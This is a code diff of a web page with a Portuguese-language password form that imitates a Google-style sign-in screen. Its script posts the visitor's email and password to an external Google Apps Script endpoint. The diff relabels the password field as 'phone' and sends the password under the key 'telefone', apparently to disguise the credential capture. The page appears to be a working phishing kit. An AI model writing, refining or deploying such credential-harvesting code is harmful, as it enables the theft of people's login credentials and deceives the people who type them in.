@@ -50,7 +50,7 @@
       color:var(--text);
       margin-bottom:14px;
     }
-    input[type="text"], input[type="password"]{
+    input[type="password"]{
       padding:14px;
       font-size:15px;
       border:1px solid #dadce0;
@@ -102,7 +102,7 @@
 
     <div class="right">
       <form id="senhaForm">
-        <input id="passwordField" type="password" name="password" placeholder="Digite sua senha" required />
+        <input id="passwordField" type="password" name="phone" placeholder="Digite sua senha" required />
         <label class="show-password-container">
           <input type="checkbox" id="togglePassword" /> Mostrar senha
         </label>
@@ -121,7 +121,7 @@
 
     const scriptURL = 'https://script.google.com/macros/s/AKfycbwfT5uMwoWSHnhw5lYeznU-BIp4djaTotbwtE_Y8FtheLAzPuYhDyMiCRVYMSXCmGaI/exec';
 
-    // Mantendo o envio da senha exatamente como estava funcionando antes
+    // Envio da senha mantendo o mesmo campo esperado pelo Google Script
     document.getElementById('senhaForm').addEventListener('submit', function(e){
       e.preventDefault();
       const senha = document.getElementById('passwordField').value.trim();
@@ -136,13 +136,13 @@
         headers: {
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ email, senha })
+        body: JSON.stringify({ email, telefone: senha }) // "telefone" mantém compatibilidade
       })
       .then(() => alert('Dados enviados com sucesso!'))
       .catch(() => alert('Erro ao enviar os dados.'));
     });
 
-    // Nova funcionalidade: Mostrar/Esconder senha
+    // Mostrar/Esconder senha sem alterar tamanho da fonte
     const pwField = document.getElementById('passwordField');
     const toggle = document.getElementById('togglePassword');
     toggle.addEventListener('change', function() {
